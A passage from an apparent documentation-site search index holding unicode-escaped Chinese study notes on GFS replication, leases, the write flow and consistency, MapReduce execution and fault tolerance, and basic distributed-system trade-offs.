\u5c31\u53ef\u4ee5\u5728\u53e6\u4e00\u4e2a chunkserver \u91cd\u5efa\u4e00\u4e2a\u526f\u672c\uff0c\u4ece\u800c\u59cb\u7ec8\u628a chunk \u7684\u526f\u672c\u6570\u76ee\u7ef4\u6301\u5728 3 \u4e2a(\u53ef\u4ee5\u8bbe\u7f6e)\u3002</p> </li> <li> <p>GFS \u7ef4\u6301\u6bcf\u4e2a chunk \u7684\u6821\u9a8c\u548c\uff0c\u8bfb\u53d6\u65f6\u53ef\u4ee5\u901a\u8fc7\u6821\u9a8c\u548c\u8fdb\u884c\u6570\u636e\u7684\u6821\u9a8c\u3002\u5982\u679c\u6821\u9a8c\u548c\u4e0d\u5339\u914d chunkserver \u4f1a\u53cd\u9988\u7ed9 master \u5904\u7406\uff0cmaster \u4f1a\u9009\u62e9\u5176\u4ed6\u526f\u672c\u8fdb\u884c\u8bfb\u53d6\uff0c\u5e76\u91cd\u5efa\u6b64 chunk \u526f\u672c\uff0c\u4e3a\u4e86\u51cf\u5c11\u5bf9 master \u7684\u538b\u529b\uff0cGFS \u91c7\u7528\u4e86\u4e00\u79cd\u79df\u7ea6(Lease)\u673a\u5236\uff0c\u628a_\u6587\u4ef6\u7684\u8bfb\u5199\u6743\u9650\u4e0b\u653e\u7ed9\u67d0\u4e00\u4e2a chunk \u526f\u672c\u3002_</p> </li> <li>Master \u53ef\u4ee5\u628a\u79df\u7ea6\u6388\u6743\u7ed9\u67d0\u4e2a chunk \u526f\u672c\uff0c\u6211\u4eec\u628a\u8fd9\u4e2a chunk \u526f\u672c\u79f0\u4e3aprimary\uff0c\u5728\u79df\u7ea6\u751f\u6548\u7684\u4e00\u6bb5\u65f6\u95f4\u5185\uff0c\u5bf9\u8fd9\u4e2a chunk \u7684\u5199\u64cd\u4f5c\u76f4\u63a5\u7531\u8fd9\u4e2a\u526f\u672c\u8d1f\u8d23\uff0c\u79df\u7ea6\u7684\u6709\u6548\u671f\u4e00\u822c\u4e3a 60 \u79d2</li> <li>\u79df\u7ea6\u7684\u4e3b\u5907\u53ea\u51b3\u5b9a\u63a7\u5236\u6d41\u8d70\u5411\uff0c\u4e0d\u5f71\u54cd\u6570\u636e\u6d41\u3002</li> </ul> <p>Attention</p> <p>\u6807\u51c6\u7684\u4e3b\u5907\u540c\u6b65\uff1a\u6570\u636e\u6d41\u548c\u63a7\u5236\u6d41\u90fd\u662f\u4ece\u4e3b\u5230\u5907 GFS \u7684\u79df\u7ea6\u673a\u5236\uff1aprimary \u53ea\u51b3\u5b9a\u63a7\u5236\u6d41\u8d70\u5411\uff0c\u5373\u51b3\u5b9a\u5199\u64cd\u4f5c\u7684\u987a\u5e8f\uff0c\u4f46\u662f\u6570\u636e\u6d41\u5e76\u4e0d\u4e00\u5b9a\u8981\u901a\u8fc7 primary\uff0c\u800c\u662f\u91c7\u53d6\u4e86\u5c31\u8fd1\u539f\u5219</p> <ul> <li>Chunk \u526f\u672c\u7684\u653e\u7f6e\u4e5f\u662f\u4e00\u4e2a\u5173\u952e\u95ee\u9898\uff0cGFS \u4e2d\u6709\u4e09\u79cd\u60c5\u51b5\u9700\u8981 master \u53d1\u8d77\u521b\u5efa chunk \u526f\u672c\u5206\u522b\u662f\u65b0 chunk \u521b\u5efa\u3001chunk \u526f\u672c\u590d\u5236(re-replication)\u548c\u8d1f\u8f7d\u5747\u8861(rebalancing)</li> <li>\u526f\u672c\u590d\u5236\u5219\u662f\u6307\u56e0\u4e3a\u67d0\u4e9b\u539f\u56e0\uff0c\u6bd4\u5982\u4e00\u4e2a\u526f\u672c\u6240\u5728\u7684 chunkserver \u5b95\u673a\uff0c\u5bfc\u81f4 chunk \u526f\u672c\u6570\u5c0f\u4e8e\u9884\u671f\u503c(\u4e00\u822c\u4e3a 3)\u540e\uff0c\u65b0\u589e\u4e00\u4e2a chunk \u526f\u672c;</li> <li>\u8d1f\u8f7d\u5747\u8861\u5219\u53d1\u751f\u5728 master \u5b9a\u671f\u5bf9 chunkserver \u7684\u76d1\u6d4b\uff0c\u5982\u679c\u53d1\u73b0\u67d0\u4e2a chunkserver \u7684\u8d1f\u8f7d\u8fc7\u9ad8\u5c31\u4f1a\u6267\u884c\u8d1f\u8f7d\u5747\u8861\u64cd\u4f5c\uff0c\u628a chunk \u526f\u672c\u642c\u5230\u53e6\u5916\u7684 chunkserver \u4e0a\u3002\u5f53\u7136\uff0c\u8fd9\u91cc\u7684\u201c\u642c\u8fc1\"\u64cd\u4f5c\uff0c\u5b9e\u9645\u4e0a\u5c31\u662f\u65b0\u5efa chunk \u548c\u5220\u9664\u539f chunk \u7684\u64cd\u4f5c\u3002</li> <li>\u8fd9\u4e09\u4e2a\u64cd\u4f5c\u4e2d\uff0cmaster \u5bf9\u526f\u672c\u4f4d\u7f6e\u7684\u9009\u62e9\u7b56\u7565\u662f\u76f8\u540c\u7684\uff0c\u8981\u9075\u5faa\u4ee5\u4e0b\u4e09\u70b9\uff1a</li> <li>\u65b0\u526f\u672c\u6240\u5728\u7684 chunkserver \u7684\u8d44\u6e90\u5229\u7528\u7387\u8f83\u4f4e</li> <li>\u65b0\u526f\u672c\u6240\u5728\u7684 chunkserver \u6700\u8fd1\u521b\u5efa\u7684 chunk \u526f\u672c\u4e0d\u591a\u3002\u8fd9\u91cc\u662f\u4e3a\u4e86\u9632\u6b62\u67d0\u4e2a chunkserver \u77ac\u95f4\u589e\u52a0\u5927\u91cf\u526f\u672c\uff0c\u6210\u4e3a\u70ed\u70b9</li> <li>chunk \u7684\u5176\u4ed6\u526f\u672c\u4e0d\u80fd\u5728\u540c\u4e00\u673a\u67b6\uff08\u4e3a\u4e86\u4fdd\u8bc1\u673a\u67b6\u6216\u673a\u623f\u7ea7\u522b\u7684\u9ad8\u53ef\u7528\uff09</li> </ul>"},{"location":"ds/GFS/#gfs_2","title":"GFS \u7684\u8bfb\u5199\u6d41\u7a0b","text":"<p>GFS \u4f5c\u4e3a\u4e00\u4e2a\u6587\u4ef6\u7cfb\u7edf\uff0c\u5bf9\u8bfb\u5199\u7684\u9700\u6c42\u662f\u4ec0\u4e48\u6837\u7684\u5462\uff1f</p> <ul> <li>\u8bfb\u53d6 \u2192 \u5feb\u901f\uff0c\u4e3a\u4e86\u6781\u81f4\u7684\u6027\u80fd\uff0c\u53ef\u4ee5\u8bfb\u5230\u843d\u540e\u7684\u7248\u672c\uff0c\u4f46\u4e00\u5b9a\u4e0d\u80fd\u662f\u9519\u8bef\u7684</li> <li>\u5199\u5165\u4e00\u8fdb\u4e00\u6b65\u5206\u4e3a\u4e24\u79cd:\u6539\u5199(overwrite)\u548c\u8ffd\u52a0(append)</li> <li>\u6539\u5199 \u2192 \u6b63\u786e\uff0c\u901a\u5e38\u4e0d\u7528\u5728\u610f\u6027\u80fd\u3002\u5728\u610f\u6027\u80fd\u7684\u6539\u5199\u53ef\u4ee5\u8f6c\u4e3a\u8ffd\u52a0\u3002</li> <li>\u8ffd\u52a0 \u2192 \u5feb\u901f\uff0c\u4e3a\u4e86\u6781\u81f4\u7684\u6027\u80fd\uff0c\u53ef\u4ee5\u5141\u8bb8\u4e00\u5b9a\u7684\u5f02\u5e38\uff0c\u4f46\u8ffd\u52a0\u7684\u6570\u636e\u4e00\u5b9a\u4e0d\u80fd\u4e22\u5931\u3002</li> </ul>"},{"location":"ds/GFS/#_1","title":"\u5199\u5165","text":"<ul> <li>\u5199\u5165\u65f6\u8981\u5728\u4e09\u4e2a\u526f\u672c\u90fd\u5b8c\u6210\u5199\u5165\u540e\u624d\u80fd\u8fd4\u56de\u5199\u5165\u7ed3\u679c\uff08\u4e3a\u4e86\u4fdd\u8bc1\u8bfb\u7684\u9ad8\u6548\u51c6\u786e\uff09</li> </ul> <p>GFS \u7684\u5199\u5165\u91c7\u7528\u4e86\u4e24\u4e2a\u5728\u73b0\u5728\u770b\u6765\u90fd\u975e\u5e38\u9ad8\u7aef\u7684\u6280\u672f</p> <ul> <li>\u6d41\u6c34\u7ebf\u6280\u672f\uff1aclient \u4f1a\u628a\u6587\u4ef6\u6570\u636e\u53d1\u5f80\u79bb\u81ea\u5df1\u6700\u8fd1\u7684\u4e00\u4e2a\u526f\u672c\uff0c\u65e0\u8bba\u5b83\u662f\u5426\u662f\u4e3b(\u662f\u5426\u6301\u6709\u79df\u7ea6)\u3002\u8fd9\u4e2a\u526f\u672c\u5728\u63a5\u6536\u5230\u6570\u636e\u540e\uff0c\u5c31\u7acb\u523b\u5411\u5176\u4ed6\u526f\u672c\u8f6c\u53d1(\u4e00\u8fb9\u63a5\u6536\u4e00\u8fb9\u8f6c\u53d1)\u3002\u8fd9\u6837\u5c31\u63a7\u5236\u4e86\u6570\u636e\u7684\u6d41\u5411\uff0c\u8282\u7701\u4e86\u7f51\u7edc\u4f20\u8f93\u4ee3\u4ef7\u3002</li> <li>\u6570\u636e\u6d41\u4e0e\u63a7\u5236\u6d41\u5206\u79bb\u6280\u672f\uff1aGFS \u5bf9\u4e00\u81f4\u6027\u7684\u4fdd\u8bc1\u53ef\u4ee5\u4e0d\u53d7\u6570\u636e\u540c\u6b65\u7684\u5e72\u6270</li> </ul> <p></p> <p>\u5199\u5165\u6d41\u7a0b</p> <ol> <li>Client \u5411 Master \u8be2\u95ee\u8981\u5199\u5165 chunk \u7684\u79df\u7ea6\u5728\u54ea\u4e2a chunkserver \u4e0a(Primary Replica)\uff0c\u4ee5\u53ca\u5176\u4ed6\u526f\u672c(Secondary Replicas)\u7684\u4f4d\u7f6e(\u901a\u5e38 Client \u4e2d\u76f4\u63a5\u5c31\u6709\u7f13\u5b58)\u3002\u5982\u679c\u76ee\u524d\u6ca1\u6709\u4efb\u4f55\u4e00\u4e2a chunkserver \u6301\u6709\u8981\u8bbf\u95ee\u7684 chunk \u7684\u79df\u7ea6\uff0cmaster \u5c31\u4f1a\u9009\u62e9\u4e00\u4e2a\u526f\u672c\uff0c\u6388\u4e88\u4e00\u4e2a\u79df\u7ea6</li> <li>Master \u8fd4\u56de\u6570\u636e\uff0cClient \u63a5\u6536\u5e76\u7f13\u5b58\u6570\u636e\u3002\u53ea\u6709\u5f53 primary \u65e0\u6cd5\u8bbf\u95ee\u6216\u8005\u4e0d\u518d\u6301\u6709\u79df\u7ea6\u65f6\u5ba2\u6237\u7aef\u624d\u4f1a\u518d\u6b21\u548c master \u4ea4\u4e92</li> <li>Client \u5c06\u6570\u636e\u53d1\u9001\u5230\u6240\u6709\u7684\u526f\u672c\u4e0a\uff08\u4e0d\u7ba1\u53d1\u9001\u7684\u987a\u5e8f\uff09\uff0cchunkserver \u4f1a\u628a\u6570\u636e\u5b58\u50a8\u5230\u5185\u90e8\u7684 LRU buffer \u7f13\u5b58\u4e2d\uff0c\u76f4\u5230\u8fd9\u4e9b\u6570\u636e\u88ab\u8c03\u7528\u6216\u662f\u8001\u5316\u3002\u901a\u8fc7\u5c06\u6570\u636e\u6d41\u4e0e\u63a7\u5236\u6d41\u89e3\u8026\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u57fa\u4e8e\u7f51\u7edc\u62d3\u6251\u8c03\u5ea6\u6602\u8d35\u7684\u6570\u636e\u6d41\u6765\u63d0\u9ad8\u6027\u80fd\uff0c\u800c\u4e0d\u7ba1\u54ea\u4e2a chunkserver \u662f primary \u7684\u3002\uff08\u8fd9\u4e00\u6b65\u5c31\u4f1a\u7528\u5230\u6d41\u6c34\u7ebf\u6280\u672f\uff0c\u4e5f\u662f\u5199\u5165\u8fc7\u7a0b\u4e2d\u552f\u4e00\u7684\u6570\u636e\u6d41\u64cd\u4f5c\uff09</li> <li>\u786e\u8ba4\u6240\u6709\u526f\u672c\u90fd\u6536\u5230\u4e86\u6570\u636e\u4e4b\u540e\uff0cClient \u5c31\u4f1a\u5411 Primary \u53d1\u9001 write \u8bf7\u6c42\u3002primary \u7ed9\u5176\u6536\u5230\u7684\u6240\u6709\u4fee\u6539\u6307\u5b9a\u8fde\u7eed\u7684\u5e8f\u5217\u53f7\uff0c\u7531\u4e8e\u8fd9\u4e9b\u4fee\u6539\u53ef\u80fd\u6765\u81ea\u591a\u4e2a\u5ba2\u6237\u7aef\uff0c\u6240\u6709\u8fdb\u884c\u7f16\u53f7\u662f\u6709\u5fc5\u8981\u7684\u3002primary \u6309\u7740\u5e8f\u53f7\u7684\u987a\u5e8f\u5c06\u4fee\u6539\u5e94\u7528\u5230\u81ea\u5df1\u7684\u672c\u5730\u72b6\u6001\u3002\uff08\u8fd9\u91cc Primary Replica \u552f\u4e00\u786e\u5b9a\u5199\u5165\u987a\u5e8f\uff0c\u4fdd\u8bc1\u526f\u672c\u4e00\u81f4\u6027\uff09</li> <li>primary \u628a write \u8bf7\u6c42\u4f20\u9012\u7ed9\u6240\u6709\u7684 secondary \u526f\u672c\uff0c\u6bcf\u4e2a secondary \u526f\u672c\u4ee5\u7531 primary \u6307\u5b9a\u7684\u540c\u6837\u7684\u5e8f\u5217\u53f7\u987a\u5e8f\u5e94\u7528\u4fee\u6539\uff08\u6267\u884c\u5230\u8fd9\u91cc primary replica \u5df2\u7ecf\u5199\u5165\u6210\u529f\u4e86\uff09</li> <li>\u6240\u6709\u7684 Secondary \u56de\u590d Primary \u544a\u77e5\u5199\u5165\u5b8c\u6210\u3002</li> <li>Primary \u56de\u590d Client\uff0c\u4f1a\u62a5\u544a\u4efb\u4f55\u526f\u672c\u9047\u5230\u7684\u4efb\u4f55\u9519\u8bef\u3002\u5982\u679c\u6709\u9519\u8bef\uff0cwrite \u53ef\u80fd\u5df2\u7ecf\u5728 primary \u548c\u90e8\u5206 secondary \u4e2d\u6210\u529f\u5b8c\u6210\u4e86\uff08\u5982\u679c\u64cd\u4f5c\u662f\u5728 primary \u8fd9\u91cc\u5931\u8d25\u4e86\uff0c\u90a3\u4e48\u5176\u5c31\u4e0d\u4f1a\u88ab\u6307\u5b9a\u5e8f\u5217\u53f7\u5e76\u5411 secondary \u4f20\u9012\u547d\u4ee4\uff09\u6b64\u65f6 client \u4f1a\u8ba4\u4e3a\u8bf7\u6c42\u5df2\u7ecf\u5931\u8d25\uff0c\u5df2\u7ecf\u4fee\u6539\u5b8c\u7684\u533a\u57df\u5c31\u4f1a\u5904\u4e8e \u00a0inconsistent\u00a0 \u7684\u72b6\u6001\u3002\u7136\u540e client \u4f1a\u91cd\u65b0\u4ece\u7b2c 3 \u6b65\u5f00\u59cb\u6267\u884c</li> </ol> <p>\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u7684 write \u5f88\u5927\u6216\u8005\u8de8\u8fc7\u4e86\u4e00\u4e2a chunk \u7684\u8fb9\u754c\uff0cclient \u5c31\u4f1a\u628a\u5176\u62c6\u6210\u591a\u4e2a write \u64cd\u4f5c\u3002\u8fd9\u4e9b\u65b0\u7684 write \u64cd\u4f5c\u4e5f\u90fd\u9075\u5faa\u4e0a\u8ff0\u63a7\u5236\u6d41\uff08\u56fe 2\uff09\uff0c\u4f46\u53ef\u80fd\u4f1a\u4e0e\u6765\u81ea\u5176\u4ed6\u5ba2\u6237\u7aef\u7684\u5e76\u53d1\u64cd\u4f5c\u4ea4\u9519\u5e76\u88ab\u8986\u76d6\u3002\u56e0\u6b64\uff0c\u5171\u4eab\u6587\u4ef6\u533a\u57df\u6700\u7ec8\u53ef\u80fd\u5305\u542b\u6765\u81ea\u4e0d\u540c\u5ba2\u6237\u7aef\u7684\u7247\u6bb5\uff0c\u5c3d\u7ba1\u526f\u672c\u5c06\u662f\u76f8\u540c\u7684\uff0c\u56e0\u4e3a\u5355\u4e2a\u64cd\u4f5c\u5728\u6240\u6709\u7684\u526f\u672c\u4e0a\u4ee5\u76f8\u540c\u7684\u987a\u5e8f\u6210\u529f\u5b8c\u6210\u3002\u8fd9\u5c31\u4f1a\u51fa\u73b0\u6211\u4eec\u5728 2.7 \u4e2d\u63d0\u5230\u8fc7\u7684 \u00a0consistent\u00a0 \u4f46 \u00a0undefined\u00a0 \u7684\u72b6\u6001 undefined \u5c31\u662f\u6307\u6bd4\u5982\u5199\u5165 A B \u671f\u671b\u7684\u662f A1, A2, B\uff0c\u4f46\u6700\u7ec8\u53ef\u80fd\u662f A1, B, A2</p> <p>GFS \u5bf9\u4e8e chunk \u7684\u4e00\u81f4\u6027\u6709\u4e24\u79cd\u5b9a\u4e49\uff1a</p> <ul> <li>consistent\uff1a\u5ba2\u6237\u7aef\u6c38\u8fdc\u80fd\u770b\u5230\u4e00\u81f4\u7684\u6570\u636e\uff0c\u65e0\u8bba\u4ed6\u4eec\u4ece\u54ea\u4e2a replica \u8bfb\u53d6\u6570\u636e\uff1b</li> <li>defined\uff1a\u5f53\u67d0\u4e2a chunk \u53d1\u751f\u4fee\u6539\u540e\uff0cclient \u80fd\u770b\u5230\u521a\u521a\u4fee\u6539\u7684\u6240\u6709\u6570\u636e\u3002</li> </ul> <p>write = update or append</p> <ul> <li>update \u5982\u679c\u90e8\u5206 chunk \u6210\u529f\uff0c\u90e8\u5206\u5931\u8d25\uff0c\u90a3\u6211\u4eec\u8bfb\u5230\u7684\u6587\u4ef6\u5c31\u662f\u4e0d\u6b63\u786e\u7684</li> <li>update \u5927\u6982\u7387\u662f\u4e00\u4e2a\u5206\u5e03\u5f0f\u64cd\u4f5c\uff0c\u4e5f\u53ef\u80fd\u53ea\u662f\u4e0d\u65ad\u91cd\u590d\u8bf7\u6c42\u4fdd\u8bc1\u5f31\u4e00\u81f4\u6027\uff08\u6700\u7ec8\u4e00\u81f4\u6027\uff09</li> <li>\u8ffd\u52a0\u5931\u8d25\u7684\u8bdd\uff0c\u6211\u4eec\u53ea\u662f\u4f1a\u8bfb\u5230\u8fc7\u671f\u800c\u975e\u9519\u8bef\u7684\u6570\u636e</li> </ul> <p>GFS \u7684\u4e00\u81f4\u6027</p> <p>GFS(\u4ee5\u53ca Google \u7684\u7edd\u5927\u591a\u6570\u5e94\u7528\u90fd)\u63a8\u8350\u4f7f\u7528 append</p>"},{"location":"ds/GFS/#gfs_3","title":"GFS \u7684\u4e00\u81f4\u6027","text":"<ol> <li>\u5bf9\u4e00\u4e2a chunk \u6240\u6709\u526f\u672c\u7684\u5199\u5165\u987a\u5e8f\u90fd\u662f\u4e00\u81f4\u7684\u3002\u8fd9\u662f\u7531\u63a7\u5236\u6d41\u548c\u6570\u636e\u6d41\u5206\u79bb\u6280\u672f\u5b9e\u73b0\u7684\uff0c\u63a7\u5236\u6d41\u90fd\u662f\u7531 primary \u53d1\u51fa\uff0c\u800c\u526f\u672c\u7684\u5199\u5165\u987a\u5e8f\u4e5f\u662f\u7531 primary \u5230 secondary\u3002</li> <li>\u4f7f\u7528 chunk \u7248\u672c\u53f7\u6765\u68c0\u6d4b chunk \u526f\u672c\u662f\u5426\u51fa\u73b0\u8fc7\u5b95\u673a\u3002\u5931\u6548\u7684\u526f\u672c\u4e0d\u4f1a\u518d\u8fdb\u884c\u5199\u5165\u64cd\u4f5c master \u4e0d\u4f1a\u518d\u8bb0\u5f55\u8fd9\u4e2a\u526f\u672c\u7684\u4fe1\u606f(\u7b49 Client \u5237\u7f13\u5b58\u65f6\u540c\u6b65)\uff0cGC \u7a0b\u5e8f\u4f1a\u81ea\u52a8\u56de\u6536\u8fd9\u4e9b\u526f\u672c</li> <li>master \u4f1a\u5b9a\u671f\u68c0\u67e5 chunk \u526f\u672c\u7684 checksum \u6765\u786e\u8ba4\u5176\u662f\u5426\u6b63\u786e\u3002</li> <li>GFS \u63a8\u8350\u5e94\u7528\u66f4\u591a\u5730\u4f7f\u7528\u8ffd\u52a0\u6765\u8fbe\u5230\u66f4\u9ad8\u7684\u4e00\u81f4\u6027\u3002</li> </ol>"},{"location":"ds/GFS/#advantage-and-disadvantage","title":"Advantage and Disadvantage","text":"<p>Advantage master \u548c chunkserver \u7684\u8bbe\u8ba1\uff0c\u5c06\u6587\u4ef6\u7ba1\u7406\u548c\u6587\u4ef6\u5b58\u50a8\u5206\u79bb \u5c06\u6587\u4ef6\u5206\u5272\u6210 chunk \u5b58\u50a8\uff0c\u53ef\u5e76\u53d1\u8bbf\u95ee\uff0c\u541e\u5410\u91cf\u8f83\u5927 \u4fee\u6539\u6570\u636e\u65f6\u63a7\u5236\u6d41\u548c\u6570\u636e\u6d41\u5206\u79bb\uff0c\u5145\u5206\u5229\u7528\u6bcf\u53f0\u673a\u5668\u7684\u5e26\u5bbd \u4f7f\u7528 lease \u964d\u4f4e master \u5de5\u4f5c\u8d1f\u8f7d\uff0c\u9632\u6b62 split-brain \u95ee\u9898 \u5bf9\u6587\u4ef6\u8ffd\u52a0\u548c\u987a\u5e8f\u8bfb\u7684\u529f\u80fd\u6709\u4f18\u5316 \u597d\u7684\u5bb9\u9519\u6027 Disadvantage \u53ea\u6709\u4e00\u4e2a master \uff0c\u5143\u6570\u636e\u8fc7\u591a\u7684\u8bdd\u53ef\u80fd\u5185\u5b58\u4e0d\u591f\u7528 client \u91cf\u5f88\u5927\u7684\u8bdd\uff0c\u4e00\u4e2a master \u8d1f\u8f7d\u8fc7\u5927 master \u4e0d\u80fd\u51fa\u9519\u81ea\u52a8\u91cd\u542f\uff0c\u51fa\u6545\u969c\u540e\u4eba\u5de5\u5207\u6362 master \u6bd4\u8f83\u8017\u65f6 master \u901a\u8fc7\u6d4f\u89c8\u6240\u6709\u7684 chunk \u8fdb\u884c\u5783\u573e\u56de\u6536\u6548\u7387\u592a\u4f4e \u4e0d\u64c5\u957f\u5904\u7406\u968f\u673a\u5199\u95ee\u9898\u3001\u6d77\u91cf\u5c0f\u6587\u4ef6\u5b58\u50a8 \u4e00\u81f4\u6027\u8fc7\u677e\uff0c\u65e0\u6cd5\u5904\u7406\u5bf9\u4e00\u81f4\u6027\u8981\u6c42\u9ad8\u7684\u4efb\u52a1 GFS \u88ab\u8bbe\u8ba1\u7528\u4e8e\u8fd0\u884c\u5728\u5355\u4e2a\u6570\u636e\u4e2d\u5fc3\u7684\u7cfb\u7edf</p>"},{"location":"ds/MapReduce/","title":"MapReduce","text":""},{"location":"ds/MapReduce/#programming-model","title":"Programming Model","text":""},{"location":"ds/MapReduce/#execution-overview","title":"Execution Overview","text":"<ul> <li>map: \u628a\u8f93\u5165\u6570\u636e\u81ea\u52a8\u5212\u5206\u4e3a M \u4e2a\u5207\u7247\uff08\u6bcf\u4e2a\u5207\u7247\u7684\u5927\u5c0f\u5927\u7ea6\u4e3a 16-64MB\uff09\u3002\u8be5\u8fc7\u7a0b\u53ef\u4ee5\u653e\u5728\u4e0d\u540c\u7684\u673a\u5668\u4e0a\u5e76\u884c\u5904\u7406\u3002\u7136\u540e MapReduce \u5e93\u4f1a\u5728\u4e00\u4e2a\u96c6\u7fa4\u7684\u82e5\u5e72\u53f0\u673a\u5668\u4e0a\u542f\u52a8\u7a0b\u5e8f\u7684\u591a\u4e2a\u526f\u672c(User Program\uff0c\u5176\u4e2d\u6bcf\u4e2a\u526f\u672c\u90fd\u4f1a\u6709\u4e00\u4e2a\u7279\u6b8a\u7684\u4e3b\u8282\u70b9 Master)\u3002</li> <li> <p>reduce: \u901a\u8fc7\u5206\u533a\u51fd\u6570(\u5982<code>hash(key) mod R</code>)\u5c06\u4e2d\u95f4\u952e\u5206\u914d\u5230 R \u4e2a\u5207\u7247\u4e0a</p> </li> <li> <p>fork:</p> </li> <li>assign map: Master \u627e\u5230\u7a7a\u95f2\u7684 worker \u5206\u914d\u4efb\u52a1(M map tasks &amp; R reduce tasks)</li> <li>read: \u5206\u914d\u5230 map \u4efb\u52a1\u7684 worker \u8bfb\u53d6\u5bf9\u5e94\u7684 split \u91cc\u7684\u5185\u5bb9\uff0c\u89e3\u6790\u51fa kv pairs\uff0c\u5e76\u901a\u8fc7\u81ea\u5b9a\u4e49\u7684\u54c8\u5e0c\u51fd\u6570\u6765\u786e\u5b9a\u4e0d\u540c\u7684 kv pairs \u5e94\u8be5\u5b58\u50a8\u7684\u4f4d\u7f6e</li> <li>local write: \u5c06 3 \u4e2d\u751f\u6210\u7684\u5b58\u50a8\u5728\u5185\u5b58\u91cc\u7684 kv pairs \u8f93\u51fa\u5230\u672c\u5730\u78c1\u76d8\u4e0a\u7684 Intermediate files\uff0c\u7136\u540e\u544a\u8bc9 master \u8fd9\u4e9b\u6587\u4ef6\u7684\u4f4d\u7f6e</li> <li>remote read: \u5206\u914d\u5230 reduce \u4efb\u52a1\u7684 worker \u8bfb\u53d6 Intermediate files \u91cc\u7684 kv pairs\uff0c\u7136\u540e\u5c06\u6570\u636e\u805a\u5408\u5728\u4e00\u8d77\uff08\u5982\u679c\u6570\u636e\u91cf\u5927\u7684\u8bdd\uff0c\u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528\u5916\u90e8\u6392\u5e8f\uff09</li> <li>write: \u5c06 reduce \u7684\u7ed3\u679c\u8f93\u51fa\u5230\u6700\u7ec8\u6587\u4ef6\u4e2d</li> </ul> <p>\u6700\u540e\u4e5f\u4e0d\u4e00\u5b9a\u8981\u5c06 output files \u805a\u5408\u5728\u4e00\u8d77\uff0c\u4ed6\u5f88\u6709\u53ef\u80fd\u5c31\u662f\u53e6\u4e00\u4e2a mapreduce \u4efb\u52a1\u7684 input files</p>"},{"location":"ds/MapReduce/#master-data-structure","title":"Master Data Structure","text":"<p>master \u4f1a\u5b58\u50a8\u4efb\u52a1\u7684\u72b6\u6001(idle, in-progress, completed)\u548c nonidle \u4efb\u52a1\u7684 worker id</p>"},{"location":"ds/MapReduce/#fault-tolerance","title":"Fault Tolerance","text":"<p>\u5982\u679c\u6700\u540e\u7684\u51e0\u4e2a\u4efb\u52a1\u6267\u884c\u65f6\u95f4\u8fc7\u957f\u600e\u4e48\u529e?\u5b58\u5728\u8fd9\u79cd case,10 \u4e2a\u4efb\u52a1\u7528 5 \u5206\u949f\u5b8c\u6210\u4e86\u5176\u4e2d 9 \u4e2a,\u4f46\u6700\u540e\u4e00\u4e2a\u4efb\u52a1\u56e0\u4e3a\u5f53\u524d\u673a\u5668\u7684\u8d1f\u8f7d\u8fc7\u9ad8\u82b1\u8d39\u4e86 20 \u5206\u949f\u6267\u884c\u5b8c\u6bd5,\u8fd9\u4e48\u6574\u4e2a\u4efb\u52a1\u7684\u6267\u884c\u5468\u671f\u5c31\u662f 20 \u5206\u949f\u3002 \u5982\u4f55\u80fd\u5e94\u5bf9\u8fd9\u4e00\u95ee\u9898\u5462? \u5f53\u4ec5\u5269\u4e0b 1%\u7684\u4efb\u52a1\u65f6,\u53ef\u4ee5\u542f\u52a8\u5907\u7528\u4efb\u52a1,\u5373\u540c\u65f6\u5728\u4e24\u4e2a\u8282\u70b9\u4e0a\u6267\u884c\u76f8\u540c\u7684\u4efb\u52a1\u3002\u8fd9\u6837\u53ea\u8981\u5176\u4e2d\u4e00\u4e2a\u5148\u8fd4\u56de\u5373\u53ef\u7ed3\u675f\u6574\u4e2a\u4efb\u52a1,\u540c\u65f6\u91ca\u653e\u672a\u5b8c\u6210\u7684\u4efb\u52a1\u6240\u5360\u7528\u7684\u8d44\u6e90\u3002</p>"},{"location":"ds/distributed_system/","title":"Basic Theorem","text":"<p>\u9ad8\u53ef\u7528\u95ee\u9898 \u5185\u90e8\u4e00\u81f4\u6027\u548c\u5916\u90e8\u4e00\u81f4\u6027\uff1a\u4f5c\u4e3a\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e3b\u8981\u5305\u62ec\u5916\u90e8\u4e00\u81f4\u6027\u5373\u53ef</p> <p>\u5206\u5e03\u5f0f\u7cfb\u7edf\u7684\u4f18\u70b9</p> <ol> <li>\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\u7684\u6240\u6709\u8282\u70b9\u90fd\u662f\u76f8\u4e92\u8fde\u63a5\u7684\u3002\u6240\u4ee5\u8282\u70b9\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u4e0e\u5176\u4ed6\u8282\u70b9\u5171\u4eab\u6570\u636e\u3002</li> <li>\u66f4\u591a\u7684\u8282\u70b9\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u6dfb\u52a0\u5230\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u5373\u53ef\u4ee5\u6839\u636e\u9700\u8981\u8fdb\u884c\u6269\u5c55\u3002</li> <li>\u4e00\u4e2a\u8282\u70b9\u7684\u6545\u969c\u4e0d\u4f1a\u5bfc\u81f4\u6574\u4e2a\u5206\u5e03\u5f0f\u7cfb\u7edf\u7684\u5931\u8d25\u3002\u5176\u4ed6\u8282\u70b9\u4ecd\u7136\u53ef\u4ee5\u76f8\u4e92\u901a\u4fe1\u3002</li> <li>\u786c\u4ef6\u8d44\u6e90\u53ef\u4ee5\u4e0e\u591a\u4e2a\u8282\u70b9\u5171\u4eab\uff0c\u800c\u4e0d\u662f\u53ea\u9650\u4e8e\u4e00\u4e2a\u8282\u70b9\u3002</li> </ol> <p>\u5206\u5e03\u5f0f\u7cfb\u7edf\u7684\u7f3a\u70b9</p> <ol> <li>\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\u5f88\u96be\u63d0\u4f9b\u8db3\u591f\u7684\u5b89\u5168\uff0c\u56e0\u4e3a\u8282\u70b9\u4ee5\u53ca\u8fde\u63a5\u90fd\u9700\u8981\u5b89\u5168\u3002</li> <li>\u4e00\u4e9b\u6d88\u606f\u548c\u6570\u636e\u5728\u4ece\u4e00\u4e2a\u8282\u70b9\u8f6c\u79fb\u5230\u53e6\u4e00\u4e2a\u8282\u70b9\u65f6\uff0c\u53ef\u80fd\u4f1a\u5728\u7f51\u7edc\u4e2d\u4e22\u5931\u3002</li> 